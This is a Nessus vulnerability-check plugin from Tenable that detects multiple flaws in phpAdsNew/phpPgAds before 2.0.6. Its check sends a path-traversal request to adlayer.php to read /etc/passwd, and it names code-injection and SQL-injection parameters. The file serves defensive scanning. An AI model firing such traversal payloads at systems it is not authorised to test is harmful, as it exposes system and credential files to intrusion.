#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19518);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2005-2498", "CVE-2005-2635", "CVE-2005-2636");
  script_bugtraq_id(
    14560, 
    14583, 
    14588, 
    14584, 
    14591
 );
  script_osvdb_id(18886, 18888, 18889);

  script_name(english:"phpAdsNew / phpPgAds < 2.0.6 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpAdsNew / phpPgAds, an open source banner
ad server. 

The version of phpAdsNews / phpPgAds installed on the remote host
suffers from several flaws :

  - Remote PHP Code Injection Vulnerability
    The XML-RPC library bundled with the application allows
    an attacker to inject arbitrary PHP code via the 
    'adxmlrpc.php' script to be executed within the context 
    of the affected web server user id.

  - Multiple Local File Include Vulnerabilities
    The application fails to sanitize user-supplied input to
    the 'layerstyle' parameter of the 'adlayer.php' script 
    and the 'language' parameter of the 'admin/js-form.php' 
    script before using them to include PHP files for 
    execution. An attacker can exploit these issues to read 
    arbitrary local files provided PHP's 'magic_quotes' 
    directive is disabled.

  - SQL Injection Vulnerability
    An attacker can manipulate SQL queries via input to the 
    'clientid' parameter of the 
    'libraries/lib-view-direct.inc.php' script." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_152005.67.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/408423/30/120/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpAdsNew / phpPgAds 2.0.6 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:ND/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/15");
 script_cvs_date("$Date: 2016/05/16 14:22:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpadsnew:phpadsnew");
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in phpAdsNew / phpPgAds < 2.0.6";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in adlayer.php to read /etc/passwd.
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/adlayer.php?",
      "layerstyle=../../../../../../../etc/passwd%00"
    ),
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but the other flaws
    #     would still be present.
    egrep(string:res, pattern:"Warning.+main\(.+/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Fatal error.+ Failed opening required '.+/etc/passwd")
  ) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
